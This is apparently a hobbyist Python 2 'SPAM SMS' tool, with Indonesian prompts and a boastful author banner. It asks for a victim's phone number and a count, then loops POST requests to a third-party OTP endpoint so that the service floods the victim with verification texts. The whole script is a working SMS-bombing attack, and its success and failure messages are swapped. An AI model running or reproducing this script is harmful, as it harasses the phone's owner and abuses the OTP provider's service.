# coding:utf8
import os,sys,json,time

try:
   import requests
except ImportError:
   print("\n [!] Silahkan install module requests")
   print("     ketik : pip2 install requests\n")
   sys.exit()


os.system('clear')

logo = """


             [/]SPAM SMS[\]

[•] AUTHOR : AZRIL X X-PLOIT DAN ANDO :V
[•] YOUTUBE : PEJUANG KENTANG DAN MR DARK:)
[•] Github : tar dulu
<------------------------------------------------>
"""

print(logo)
target = raw_input("(isi yg benar sempak) [•] Target>> : ")
jumlah = raw_input(" [~] jumlah>> : ")
print('')

req = requests.Session()

url = "https://api.harnicid.com/phone_auth_OTP"
for i in range(int(jumlah)):
        respon = req.post(url,data={'phone':target}).text
        status = json.loads(respon)['message']
        if status == 'OTP sent':
                print(" Sent To "+ target +" Failed")
                time.sleep(2)
        else:
                print(" Sent To "+ target +" Succes")
                time.sleep(2)
